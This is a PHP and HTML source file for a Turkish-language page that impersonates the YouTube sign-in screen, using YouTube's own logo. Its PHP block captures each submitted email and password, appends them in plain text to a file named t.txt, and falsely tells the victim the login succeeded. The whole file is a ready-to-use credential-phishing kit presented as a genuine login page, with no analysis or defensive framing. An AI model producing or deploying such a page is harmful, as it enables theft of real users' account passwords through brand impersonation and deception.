<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $sifre = $_POST['sifre'];

    $bilgi = "E-posta: " . $email . "\nŞifre: " . $sifre . "\n\n";

    $dosya = fopen("t.txt", "a");
    fwrite($dosya, $bilgi);
    fclose($dosya);

    echo "<script>alert('Giriş başarılı!');</script>";
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube'a Giriş Yap</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #f9f9f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 48px 40px 36px;
            width: 450px;
        }
        .logo {
            display: block;
            margin: 0 auto 30px;
            width: 75px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 30px;
            text-align: center;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input[type="email"], input[type="password"] {
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 20px;
            padding: 13px 15px;
        }
        input[type="submit"] {
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            color: white;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            padding: 10px 24px;
            text-transform: uppercase;
        }
        input[type="submit"]:hover {
            background-color: #287ae6;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.youtube.com/img/desktop/yt_1200.png" alt="YouTube Logo" class="logo">
        <h1>YouTube'a Giriş Yap</h1>
        <form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
            <input type="email" name="email" placeholder="E-posta" required>
            <input type="password" name="sifre" placeholder="Şifre" required>
            <input type="submit" value="Giriş Yap">
        </form>
    </div>
</body>
</html>
